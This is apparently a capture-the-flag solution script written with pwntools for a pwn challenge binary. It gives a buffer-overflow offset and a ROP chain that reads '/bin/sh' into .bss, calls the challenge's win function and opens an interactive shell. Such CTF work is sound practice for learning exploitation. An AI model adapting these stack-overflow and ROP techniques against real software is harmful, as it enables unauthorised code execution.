# Reference Link ... by Team C0UGH1NGB4BY from APU
# https://saladbkp.github.io/2025/05/09/ALL%20PWN%20Challenges%20BBCTF,%20all%20no%20pie/ 

from pwn import *
elf = context.binary = ELF('./chall')

p = process('./chall')
# p = remote("IP_ADDR", PORT)

offset = 0x40 + 0x8
read_plt = elf.plt['read']
WIN_ADDR = elf.sym['win']
log.success(f"WIN_ADDR: {hex(WIN_ADDR)}")

bss_addr = elf.get_section_by_name('.bss').header.sh_addr
binsh = bss_addr + 0x100
log.success(f"binsh: {hex(binsh)}")

# Create the payload
# 1. Read /bin/sh into .bss
# 2. Call win with args (0x539, binsh)

rop = ROP(elf)
rop.call(read_plt, [0, binsh, 16])
rop.call(WIN_ADDR, [0x539, binsh])
payload = b'A' * offset + rop.chain()

p.sendlineafter(b"Enter something: ", b"A")
p.sendlineafter(b"Enter message: ", payload)
p.sendline(b"/bin/sh")

p.interactive()